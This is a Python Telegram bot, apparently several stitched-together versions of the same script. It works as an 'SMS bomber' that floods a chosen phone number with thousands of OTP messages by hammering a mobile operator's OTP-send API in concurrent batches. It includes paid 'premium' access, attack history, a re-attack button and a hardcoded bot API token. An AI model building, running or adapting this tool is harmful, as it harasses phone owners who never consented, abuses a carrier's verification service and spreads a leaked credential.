        r_text = "⏳ **Running Attacks**\n━━━━━━━━━━━━━━━━━━━━\n"
        for uid, data in active_attacks.items():
            r_text += f"👤 User: `{uid}`\n📱 Target: `{data['target']}`\n🕒 Started: `{data['start_time']}`\n📡 Status: `{data['state'].upper()}`\n━━━━━━━━━━━━━━\n"
        await bot.send_message(cid, r_text, parse_mode='Markdown')

    elif text == "💎 My Status":
        is_prem = "Premium 💎" if cid in authorized_users else "Free 🆓"
        await bot.reply_to(message, f"👤 **User:** {message.from_user.first_name}\n🆔 **ID:** `{cid}`\n📊 **Status:** {is_prem}", parse_mode='Markdown')

    elif text == "📊 System Info":
        info = f"🖥 **CPU:** {psutil.cpu_percent()}% | **RAM:** {psutil.virtual_memory().percent}% | **Time:** {get_bd_time().strftime('%I:%M %p')}"
        await bot.reply_to(message, info, parse_mode='Markdown')

    elif text == "📞 Support":
        await bot.reply_to(message, "📞 **Contact Admin:** @itzrkraihan")

    # Input Flow
    elif cid in user_states and user_states[cid] == 'get_num':
        if len(text) == 11 and text.isdigit():
            user_states[cid] = {'st': 'get_lim', 'n': text}
            await bot.send_message(cid, "🔢 **SMS এর সংখ্যা দিন (Max 5000):**")
        else: await bot.reply_to(message, "❌ সঠিক নম্বর দিন।")

    elif cid in user_states and isinstance(user_states[cid], dict) and user_states[cid].get('st') == 'get_lim':
        try:
            limit = min(int(text), 5000)
            num = user_states[cid]['n']
            del user_states[cid]
            start_time_str = get_bd_time().strftime("%I:%M:%S %p")
            msg = await bot.send_message(cid, "⚙️ **ইঞ্জিন লোড হচ্ছে...**")
            asyncio.create_task(run_attack(cid, msg.message_id, num, limit, start_time_str))
        except: await bot.reply_to(message, "❌ সঠিক সংখ্যা দিন।")

@bot.callback_query_handler(func=lambda call: True)
async def cb_handler(call):
    cid = call.message.chat.id
    if cid in active_attacks:
        if call.data == "pause": active_attacks[cid]['state'] = 'paused'
        elif call.data == "resume": active_attacks[cid]['state'] = 'running'
        elif call.data == "stop": active_attacks[cid]['state'] = 'stopped'
        await bot.answer_callback_query(call.id, f"Action: {call.data}")

if __name__ == "__main__":
    print("RK V9 IS LIVE...")
    asyncio.run(bot.polling(non_stop=True))
import asyncio
import aiohttp
import telebot
import time
import datetime
import pytz
import psutil
import json
import os
from telebot.async_telebot import AsyncTeleBot
from telebot import types

# --- CONFIGURATION & SETUP ---
API_TOKEN = '8479817459:AAEgiLY2rnRuzsgCbD91nTzCdDMTaM_vOAs'
ADMIN_ID = 6048050987  
TARGET_URL = "https://da-api.robi.com.bd/da-nll/otp/send"
DB_FILE = "rk_database.json"
HISTORY_FILE = "attack_history.json"

bot = AsyncTeleBot(API_TOKEN)
active_attacks = {} 
user_states = {}

# --- DATABASE ENGINE ---
def load_data(file, default):
    if os.path.exists(file):
        with open(file, "r") as f:
            try: return json.load(f)
            except: return default
    return default

def save_data(file, data):
    with open(file, "w") as f:
        json.dump(data, f, indent=4)

# Initialize DBs
db = load_data(DB_FILE, {"premium_users": [ADMIN_ID], "total_hits": 0})
history = load_data(HISTORY_FILE, [])

def is_premium(chat_id):
    return chat_id in db["premium_users"]

# --- HELPER FUNCTIONS ---
def get_bd_time():
    return datetime.datetime.now(pytz.timezone('Asia/Dhaka'))

def format_time(dt):
    return dt.strftime("%I:%M:%S %p | %d-%b-%Y")

# --- UI KEYBOARDS (ENHANCED) ---
def main_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        types.KeyboardButton("🚀 Start Attack"),
        types.KeyboardButton("💎 My Status"),
        types.KeyboardButton("📊 System Info"),
        types.KeyboardButton("📜 Attack History"),
        types.KeyboardButton("🔄 Running Attacks"),
        types.KeyboardButton("📞 Support")
    )
    return markup

def attack_control_markup(state):
    markup = types.InlineKeyboardMarkup(row_width=2)
    p_text = "⏸ Pause" if state == 'running' else "▶️ Resume"
    p_data = "pause" if state == 'running' else "resume"
    markup.add(
        types.InlineKeyboardButton(p_text, callback_data=p_data),
        types.InlineKeyboardButton("⏹ Stop", callback_data="stop")
    )
    return markup

# --- CORE BOMBING ENGINE ---
async def send_request(session, number, stats):
    headers = {"Content-Type": "application/json"}
    try:
        async with session.post(TARGET_URL, json={"msisdn": number}, headers=headers, timeout=10) as resp:
            if resp.status == 200: stats['success'] += 1
            else: stats['fail'] += 1
    except: stats['fail'] += 1
    stats['total'] += 1

async def run_attack(chat_id, message_id, number, limit, start_dt):
    stats = {'success': 0, 'fail': 0, 'total': 0}
    active_attacks[chat_id] = {
        'state': 'running',
        'target': number,
        'limit': limit,
        'start_time': start_dt.strftime("%H:%M:%S")
    }
    
    start_ts = time.time()
    
    async with aiohttp.ClientSession() as session:
        while stats['total'] < limit:
            current = active_attacks.get(chat_id)
            if not current or current['state'] == 'stopped': break
            if current['state'] == 'paused':
                await asyncio.sleep(1)
                continue

            batch = min(20, limit - stats['total'])
            tasks = [send_request(session, number, stats) for _ in range(batch)]
            await asyncio.gather(*tasks)

            # UI Update Calculations
            percent = int((stats['total'] / limit) * 100)
            elapsed = time.time() - start_ts
            etr = "Calculating..."
            if stats['total'] > 0:
                rem_time = (elapsed / stats['total']) * (limit - stats['total'])
                etr = f"{int(rem_time)}s"

            try:
                bar = "🔹" * (percent // 10) + "▫️" * (10 - (percent // 10))
                text = (
                    f"⚡ **RK ULTIMATE MONITOR V10** ⚡\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"📱 **Target:** `{number}`\n"
                    f"📊 **Progress:** `{percent}%` | {bar}\n"
                    f"✅ **Success:** `{stats['success']}` | ❌ **Fail:** `{stats['fail']}`\n"
                    f"🔢 **Total Sent:** `{stats['total']}/{limit}`\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"⏱ **Start Time:** `{start_dt.strftime('%I:%M:%S %p')}`\n"
                    f"⏳ **Elapsed:** `{int(elapsed)}s` | ⏳ **ETR:** `{etr}`\n"
                    f"📡 **Status:** `{current['state'].upper()}`"
                )
                await bot.edit_message_text(text, chat_id, message_id, reply_markup=attack_control_markup(current['state']), parse_mode='Markdown')
            except: pass
            await asyncio.sleep(0.7)

    # Save to History
    history.append({
        "user": chat_id,
        "target": number,
        "amount": stats['total'],
        "success": stats['success'],
        "date": format_time(get_bd_time())
    })
    save_data(HISTORY_FILE, history[-50:]) # Keep last 50
    db["total_hits"] += stats['success']
    save_data(DB_FILE, db)

    await bot.send_message(chat_id, f"🏁 **Attack Finished!**\nTarget: `{number}`\nTotal: `{stats['total']}`", reply_markup=main_keyboard())
    active_attacks.pop(chat_id, None)

# --- HANDLERS ---
@bot.message_handler(commands=['start'])
async def cmd_start(message):
    await bot.send_message(
        message.chat.id, 
        f"🔥 **Welcome to RK SYSTEM V10**\n━━━━━━━━━━━━━━━━━━━━\nUser: `{message.from_user.first_name}`\nRole: `{'Premium' if is_premium(message.chat.id) else 'Free'}`",
        reply_markup=main_keyboard(), parse_mode='Markdown'
    )

@bot.message_handler(func=lambda m: True)
async def text_handler(message):
    cid = message.chat.id
    text = message.text

    if text == "🚀 Start Attack":
        if not is_premium(cid): return await bot.reply_to(message, "❌ **Premium Required!**")
        user_states[cid] = 'get_num'
        await bot.send_message(cid, "📞 **Target নম্বর দিন (১১ ডিজিট):**", reply_markup=types.ReplyKeyboardRemove())

    elif text == "📜 Attack History":
        user_history = [h for h in history if h['user'] == cid][-5:]
        if not user_history: return await bot.reply_to(message, "📭 কোনো ইতিহাস পাওয়া যায়নি।")
        res = "📜 **Your Last 5 Attacks:**\n━━━━━━━━━━━━━━━━━━━━\n"
        for h in user_history:
            res += f"📱 `{h['target']}` | ✅ `{h['success']}`\n📅 {h['date']}\n\n"
        await bot.send_message(cid, res, parse_mode='Markdown')

    elif text == "🔄 Running Attacks":
        if not active_attacks: return await bot.reply_to(message, "🚫 বর্তমানে কোনো অ্যাটাক চলছে না।")
        res = "🔄 **Active Sessions:**\n━━━━━━━━━━━━━━━━━━━━\n"
        for uid, data in active_attacks.items():
            res += f"👤 UserID: `{uid}`\n📱 Target: `{data['target']}`\n⏱ Start: `{data['start_time']}`\n\n"
        await bot.send_message(cid, res, parse_mode='Markdown')

    elif text == "📊 System Info":
        info = (
            f"🖥 **Server Stats**\n━━━━━━━━━━━━━━━━━━━━\n"
            f"🚀 CPU: `{psutil.cpu_percent()}%` | RAM: `{psutil.virtual_memory().percent}%` \n"
            f"💎 Total Hits: `{db['total_hits']}`\n"
            f"🕒 Time: `{get_bd_time().strftime('%I:%M %p')}`"
        )
        await bot.send_message(cid, info, parse_mode='Markdown')

    # Input Logic
    elif cid in user_states and user_states[cid] == 'get_num':
        if len(text) == 11 and text.isdigit():
            user_states[cid] = {'st': 'get_lim', 'n': text}
            await bot.send_message(cid, "🔢 **SMS এর সংখ্যা দিন (Max 5000):**")
        else: await bot.reply_to(message, "❌ সঠিক নম্বর দিন।")

    elif cid in user_states and isinstance(user_states[cid], dict) and user_states[cid].get('st') == 'get_lim':
        try:
            limit = min(int(text), 5000)
            num = user_states[cid]['n']
            del user_states[cid]
            msg = await bot.send_message(cid, "⚙️ **Engine Starting...**")
            asyncio.create_task(run_attack(cid, msg.message_id, num, limit, get_bd_time()))
        except: await bot.reply_to(message, "❌ সংখ্যা দিন।")

# --- ADMIN COMMANDS ---
@bot.message_handler(commands=['add'])
async def add_user(message):
    if message.from_user.id == ADMIN_ID:
        try:
            uid = int(message.text.split()[1])
            if uid not in db["premium_users"]:
                db["premium_users"].append(uid)
                save_data(DB_FILE, db)
                await bot.reply_to(message, f"✅ `{uid}` Added to Premium.")
        except: await bot.reply_to(message, "Usage: `/add ID`")

@bot.callback_query_handler(func=lambda call: True)
async def cb_handler(call):
    cid = call.message.chat.id
    if cid in active_attacks:
        if call.data == "pause": active_attacks[cid]['state'] = 'paused'
        elif call.data == "resume": active_attacks[cid]['state'] = 'running'
        elif call.data == "stop": active_attacks[cid]['state'] = 'stopped'
        await bot.answer_callback_query(call.id, f"Executed: {call.data}")

if __name__ == "__main__":
    print("RK V10 IS RUNNING...")
    asyncio.run(bot.polling(non_stop=True))
import asyncio
import aiohttp
import telebot
import time
import datetime
import pytz
import psutil
import json
import os
from telebot.async_telebot import AsyncTeleBot
from telebot import types

# --- CONFIGURATION ---
API_TOKEN = '8479817459:AAEgiLY2rnRuzsgCbD91nTzCdDMTaM_vOAs'
ADMIN_ID = 6048050987  
TARGET_URL = "https://da-api.robi.com.bd/da-nll/otp/send"
DB_FILE = "users_db.json"
HISTORY_FILE = "attack_history.json"

bot = AsyncTeleBot(API_TOKEN)
active_attacks = {} 
user_states = {}

# --- DATABASE MANAGEMENT ---
def load_json(filename, default_val):
    if os.path.exists(filename):
        with open(filename, "r") as f:
            return json.load(f)
    return default_val

def save_json(filename, data):
    with open(filename, "w") as f:
        json.dump(data, f, indent=4)

authorized_users = set(load_json(DB_FILE, [ADMIN_ID]))
attack_history = load_json(HISTORY_FILE, [])

# --- HELPERS ---
def get_bd_time():
    return datetime.datetime.now(pytz.timezone('Asia/Dhaka'))

def format_time(dt):
    return dt.strftime("%I:%M:%S %p | %d-%m-%Y")

# --- UI KEYBOARDS ---
def main_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        types.KeyboardButton("🚀 Start Attack"),
        types.KeyboardButton("💎 My Status"),
        types.KeyboardButton("📊 System Info"),
        types.KeyboardButton("📜 History"),
        types.KeyboardButton("🏃 Running Attacks"),
        types.KeyboardButton("📞 Support")
    )
    return markup

def attack_control_markup(state):
    markup = types.InlineKeyboardMarkup(row_width=2)
    p_text = "⏸ Pause" if state == 'running' else "▶️ Resume"
    p_data = "pause" if state == 'running' else "resume"
    markup.add(
        types.InlineKeyboardButton(p_text, callback_data=p_data),
        types.InlineKeyboardButton("⏹ Stop", callback_data="stop")
    )
    return markup

# --- CORE BOMBING ENGINE ---
async def send_request(session, number, stats):
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    try:
        async with session.post(TARGET_URL, json={"msisdn": number}, headers=headers, timeout=10) as resp:
            if resp.status == 200: stats['success'] += 1
            else: stats['fail'] += 1
    except: stats['fail'] += 1
    stats['total'] += 1

async def run_attack(chat_id, message_id, number, limit):
    start_dt = get_bd_time()
    stats = {'success': 0, 'fail': 0, 'total': 0}
    active_attacks[chat_id] = {
        'state': 'running', 
        'target': number, 
        'start_at': format_time(start_dt),
        'limit': limit
    }
    
    start_ts = time.time()

    async with aiohttp.ClientSession() as session:
        while stats['total'] < limit:
            curr = active_attacks.get(chat_id)
            if not curr or curr['state'] == 'stopped': break
            if curr['state'] == 'paused':
                await asyncio.sleep(1)
                continue

            batch = min(20, limit - stats['total'])
            tasks = [send_request(session, number, stats) for _ in range(batch)]
            await asyncio.gather(*tasks)

            # calculations
            percent = int((stats['total'] / limit) * 100)
            elapsed = int(time.time() - start_ts)
            etr = "Calculating..."
            if stats['total'] > 0:
                etr = f"{int((elapsed / stats['total']) * (limit - stats['total']))}s"

            try:
                progress_bar = "🔹" * (percent // 10) + "▫️" * (10 - (percent // 10))
                text = (
                    f"⚡ **RK ULTIMATE MONITOR V10** ⚡\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"📱 **Target:** `{number}`\n"
                    f"📊 **Progress:** `{percent}%` [{progress_bar}]\n"
                    f"✅ **Success:** `{stats['success']}` | ❌ **Fail:** `{stats['fail']}`\n"
                    f"🔢 **Total Sent:** `{stats['total']}/{limit}`\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"⏱ **Started At:** `{active_attacks[chat_id]['start_at']}`\n"
                    f"⏳ **Elapsed:** `{elapsed}s` | ⏳ **ETR:** `{etr}`\n"
                    f"📡 **Status:** `{curr['state'].upper()}`"
                )
                await bot.edit_message_text(text, chat_id, message_id, reply_markup=attack_control_markup(curr['state']), parse_mode='Markdown')
            except: pass
            await asyncio.sleep(0.8)

    # Save to History
    history_entry = {
        "user": chat_id,
        "target": number,
        "limit": limit,
        "success": stats['success'],
        "date": format_time(get_bd_time())
    }
    attack_history.append(history_entry)
    save_json(HISTORY_FILE, attack_history[-50:]) # Keep last 50 entries

    await bot.send_message(chat_id, f"🏁 **ATTACK FINISHED**\n━━━━━━━━━━━━━━\n📱 Target: `{number}`\n✅ Success: {stats['success']}\n🕒 Time: {format_time(get_bd_time())}", reply_markup=main_keyboard())
    active_attacks.pop(chat_id, None)

# --- COMMANDS ---
@bot.message_handler(commands=['start'])
async def cmd_start(message):
    bot_info = await bot.get_me()
    welcome = (
        f"🔥 **RK PREMIUM BOMBER V10** 🔥\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 User: `{message.from_user.first_name}`\n"
        f"🆔 ID: `{message.chat.id}`\n\n"
        f"Welcome to the most advanced SMS Stress Testing tool. Type /help to see all commands."
    )
    # Set bot commands menu
    await bot.set_my_commands([
        types.BotCommand("start", "Restart the bot"),
        types.BotCommand("attack", "Start new attack"),
        types.BotCommand("history", "View your history"),
        types.BotCommand("running", "Check active attacks"),
        types.BotCommand("status", "Check subscription"),
        types.BotCommand("info", "System performance"),
        types.BotCommand("help", "Get help menu")
    ])
    await bot.send_message(message.chat.id, welcome, reply_markup=main_keyboard(), parse_mode='Markdown')

@bot.message_handler(func=lambda m: m.text == "📜 History" or m.text == "/history")
async def show_history(message):
    user_history = [h for h in attack_history if h['user'] == message.chat.id][-5:]
    if not user_history:
        return await bot.reply_to(message, "📭 কোনো অ্যাটাক হিস্ট্রি পাওয়া যায়নি।")
    
    text = "📜 **YOUR LAST 5 ATTACKS**\n━━━━━━━━━━━━━━\n"
    for h in user_history:
        text += f"📱 `{h['target']}` | ✅ {h['success']} | 📅 {h['date']}\n"
    await bot.send_message(message.chat.id, text, parse_mode='Markdown')

@bot.message_handler(func=lambda m: m.text == "🏃 Running Attacks" or m.text == "/running")
async def show_running(message):
    if not active_attacks:
        return await bot.reply_to(message, "💤 বর্তমানে কোনো অ্যাটাক চলছে না।")
    
    text = "🏃 **CURRENTLY RUNNING**\n━━━━━━━━━━━━━━\n"
    for cid, data in active_attacks.items():
        text += f"📱 Target: `{data['target']}`\n👤 User ID: `{cid}`\n🕒 Started: `{data['start_at']}`\n\n"
    await bot.send_message(message.chat.id, text, parse_mode='Markdown')

@bot.message_handler(func=lambda m: True)
async def main_handler(message):
    cid = message.chat.id
    text = message.text

    if text == "🚀 Start Attack" or text == "/attack":
        if cid not in authorized_users:
            return await bot.reply_to(message, "❌ **Premium Access Required!**\nContact @itzrkraihan to upgrade.")
        user_states[cid] = 'wait_num'
        await bot.send_message(cid, "📞 **Target নম্বর দিন (১১ ডিজিট):**", reply_markup=types.ReplyKeyboardRemove())

    elif text == "💎 My Status" or text == "/status":
        st = "Premium 💎" if cid in authorized_users else "Free 🆓"
        await bot.reply_to(message, f"👤 User: {message.from_user.first_name}\n📊 Status: {st}\n📅 Server Time: {get_bd_time().strftime('%I:%M %p')}")

    elif text == "📊 System Info" or text == "/info":
        info = (
            f"🖥 **SYSTEM MONITOR**\n"
            f"━━━━━━━━━━━━━━\n"
            f"⚙️ CPU: `{psutil.cpu_percent()}%`\n"
            f"🧠 RAM: `{psutil.virtual_memory().percent}%`\n"
            f"📡 Active Attacks: `{len(active_attacks)}`"
        )
        await bot.reply_to(message, info, parse_mode='Markdown')

    elif text == "📞 Support":
        await bot.reply_to(message, "📢 **Owner:** @itzrkraihan\n💬 কোনো সমস্যা হলে ইনবক্স করুন।")

    # FSM Inputs
    elif cid in user_states and user_states[cid] == 'wait_num':
        if len(text) == 11 and text.isdigit():
            user_states[cid] = {'st': 'wait_lim', 'n': text}
            await bot.send_message(cid, "🔢 **অ্যাটাক লিমিট দিন (Max 5000):**")
        else: await bot.reply_to(message, "❌ সঠিক ১১ ডিজিট নম্বর দিন।")

    elif cid in user_states and isinstance(user_states[cid], dict) and user_states[cid].get('st') == 'wait_lim':
        try:
            limit = min(int(text), 5000)
            num = user_states[cid]['n']
            del user_states[cid]
            msg = await bot.send_message(cid, "🚀 **অ্যাটাক ইনিশিয়ালাইজ হচ্ছে...**")
            asyncio.create_task(run_attack(cid, msg.message_id, num, limit))
        except: await bot.reply_to(message, "❌ সঠিক সংখ্যা দিন।")

# --- ADMIN COMMANDS ---
@bot.message_handler(commands=['add'])
async def admin_add(message):
    if message.from_user.id == ADMIN_ID:
        try:
            uid = int(message.text.split()[1])
            authorized_users.add(uid)
            save_json(DB_FILE, list(authorized_users))
            await bot.reply_to(message, f"✅ User `{uid}` Added successfully.")
        except: await bot.reply_to(message, "Usage: `/add UserID`")

@bot.callback_query_handler(func=lambda call: True)
async def cb_handler(call):
    cid = call.message.chat.id
    if cid in active_attacks:
        if call.data == "pause": active_attacks[cid]['state'] = 'paused'
        elif call.data == "resume": active_attacks[cid]['state'] = 'running'
        elif call.data == "stop": active_attacks[cid]['state'] = 'stopped'
        await bot.answer_callback_query(call.id, f"Action: {call.data.upper()}")

if __name__ == "__main__":
    print("RK V10 IS RUNNING...")
    asyncio.run(bot.polling(non_stop=True))
import asyncio
import aiohttp
import telebot
import time
import datetime
import pytz
import psutil
import json
import os
from telebot.async_telebot import AsyncTeleBot
from telebot import types

# --- CONFIGURATION ---
API_TOKEN = '8479817459:AAEgiLY2rnRuzsgCbD91nTzCdDMTaM_vOAs'
ADMIN_ID = 6048050987  
TARGET_URL = "https://da-api.robi.com.bd/da-nll/otp/send"
USERS_DB = "users.json"
HISTORY_DB = "history.json"

bot = AsyncTeleBot(API_TOKEN)
active_attacks = {} 
user_states = {}

# --- DATABASE LOADING ---
def load_data(file, default):
    if os.path.exists(file):
        with open(file, "r") as f: return json.load(f)
    return default

def save_data(file, data):
    with open(file, "w") as f: json.dump(data, f, indent=4)

authorized_users = set(load_data(USERS_DB, [ADMIN_ID]))
attack_history = load_data(HISTORY_DB, [])

# --- HELPERS ---
def get_bd_time():
    return datetime.datetime.now(pytz.timezone('Asia/Dhaka'))

# --- UI KEYBOARDS ---
def main_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🚀 Start Attack", "💎 My Status")
    markup.add("📊 Running", "📜 History")
    markup.add("📊 System Info", "📞 Support")
    return markup

def attack_control_markup(state):
    markup = types.InlineKeyboardMarkup(row_width=2)
    p_text = "⏸ Pause" if state == 'running' else "▶️ Resume"
    p_data = "pause" if state == 'running' else "resume"
    markup.add(
        types.InlineKeyboardButton(p_text, callback_data=p_data),
        types.InlineKeyboardButton("⏹ Stop", callback_data="stop")
    )
    return markup

# --- CORE ENGINE ---
async def send_request(session, number, stats):
    headers = {"Content-Type": "application/json"}
    try:
        async with session.post(TARGET_URL, json={"msisdn": number}, headers=headers, timeout=10) as resp:
            if resp.status == 200: stats['success'] += 1
            else: stats['fail'] += 1
    except: stats['fail'] += 1
    stats['total'] += 1

async def run_attack(chat_id, message_id, number, limit):
    start_dt = get_bd_time()
    stats = {'success': 0, 'fail': 0, 'total': 0}
    active_attacks[chat_id] = {'state': 'running', 'num': number, 'start': start_dt.strftime('%I:%M:%S %p')}
    
    async with aiohttp.ClientSession() as session:
        while stats['total'] < limit:
            state = active_attacks.get(chat_id, {}).get('state')
            if not state or state == 'stopped': break
            if state == 'paused':
                await asyncio.sleep(1); continue

            batch = min(15, limit - stats['total'])
            await asyncio.gather(*[send_request(session, number, stats) for _ in range(batch)])

            percent = int((stats['total'] / limit) * 100)
            bar = "🔹" * (percent // 10) + "▫️" * (10 - (percent // 10))
            
            try:
                text = (
                    f"🔥 **RK ULTIMATE MONITOR** 🔥\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"📱 **Target:** `{number}`\n"
                    f"🚀 **Start Time:** `{active_attacks[chat_id]['start']}`\n"
                    f"📊 **Progress:** `{percent}%` | {bar}\n"
                    f"✅ **Success:** `{stats['success']}` | ❌ **Fail:** `{stats['fail']}`\n"
                    f"🔢 **Total:** `{stats['total']}/{limit}`\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"📡 **Status:** `{state.upper()}`"
                )
                await bot.edit_message_text(text, chat_id, message_id, reply_markup=attack_control_markup(state), parse_mode='Markdown')
            except: pass
            await asyncio.sleep(0.8)

    # Save to History
    history_entry = {
        "num": number,
        "total": stats['success'],
        "date": start_dt.strftime('%d-%m-%Y'),
        "time": start_dt.strftime('%I:%M %p')
    }
    attack_history.append(history_entry)
    save_data(HISTORY_DB, attack_history[-20:]) # Keep last 20
    
    await bot.send_message(chat_id, f"🏁 **Attack Completed!**\nTarget: `{number}`\nSuccess: {stats['success']}", reply_markup=main_keyboard())
    active_attacks.pop(chat_id, None)

# --- COMMANDS ---
@bot.message_handler(commands=['start'])
async def cmd_start(message):
    await bot.send_message(message.chat.id, f"🔥 **RK PREMIUM V10**\nস্বাগতম {message.from_user.first_name}!", reply_markup=main_keyboard())

@bot.message_handler(func=lambda m: True)
async def handle_all(message):
    cid = message.chat.id
    text = message.text

    if text == "🚀 Start Attack":
        if cid not in authorized_users: return await bot.reply_to(message, "❌ No Access!")
        user_states[cid] = 'get_num'
        await bot.send_message(cid, "📞 Target Number দিন (11 digit):", reply_markup=types.ReplyKeyboardRemove())

    elif text == "📊 Running":
        if not active_attacks: return await bot.reply_to(message, "এখন কোনো অ্যাটাক চলছে না।")
        run_text = "🛰 **Current Running Attacks:**\n\n"
        for uid, info in active_attacks.items():
            run_text += f"📱 `{info['num']}` - Start: `{info['start']}`\n"
        await bot.reply_to(message, run_text, parse_mode='Markdown')

    elif text == "📜 History":
        if not attack_history: return await bot.reply_to(message, "ইতিহাস খালি!")
        markup = types.InlineKeyboardMarkup()
        for i, h in enumerate(reversed(attack_history[-10:])):
            btn = types.InlineKeyboardButton(f"📱 {h['num']} ({h['time']})", callback_data=f"re_{h['num']}")
            markup.add(btn)
        await bot.send_message(cid, "📜 **অ্যাটাক হিস্ট্রি (Re-Attack করতে ক্লিক করুন):**", reply_markup=markup, parse_mode='Markdown')

    elif text == "📊 System Info":
        await bot.reply_to(message, f"🖥 CPU: {psutil.cpu_percent()}% | RAM: {psutil.virtual_memory().percent}%")

    # Input Handlers
    elif cid in user_states and user_states[cid] == 'get_num':
        if len(text) == 11:
            user_states[cid] = {'st': 'get_lim', 'n': text}
            await bot.send_message(cid, "🔢 কতটি SMS?")
        else: await bot.reply_to(message, "ভুল নম্বর!")

    elif cid in user_states and isinstance(user_states[cid], dict) and user_states[cid].get('st') == 'get_lim':
        try:
            limit = int(text)
            num = user_states[cid]['n']
            del user_states[cid]
            msg = await bot.send_message(cid, "⚙️ ইঞ্জিন চালু হচ্ছে...")
            asyncio.create_task(run_attack(cid, msg.message_id, num, limit))
        except: await bot.reply_to(message, "সংখ্যা দিন!")

# --- CALLBACKS ---
@bot.callback_query_handler(func=lambda call: True)
async def cb_handler(call):
    cid = call.message.chat.id
    if call.data.startswith("re_"):
        num = call.data.split("_")[1]
        user_states[cid] = {'st': 'get_lim', 'n': num}
        await bot.send_message(cid, f"🔄 **Re-Attacking {num}**\nকতটি SMS পাঠাবেন?")
        await bot.answer_callback_query(call.id)
    
    elif cid in active_attacks:
        if call.data == "pause": active_attacks[cid]['state'] = 'paused'
        elif call.data == "resume": active_attacks[cid]['state'] = 'running'
        elif call.data == "stop": active_attacks[cid]['state'] = 'stopped'
        await bot.answer_callback_query(call.id, f"Done: {call.data}")

# --- ADMIN ---
@bot.message_handler(commands=['add'])
async def cmd_add(message):
    if message.from_user.id == ADMIN_ID:
        uid = int(message.text.split()[1])
        authorized_users.add(uid)
        save_data(USERS_DB, list(authorized_users))
        await bot.reply_to(message, f"✅ User {uid} Added!")

if __name__ == "__main__":
    print("RK V10 IS RUNNING...")
    asyncio.run(bot.polling(non_stop=True))
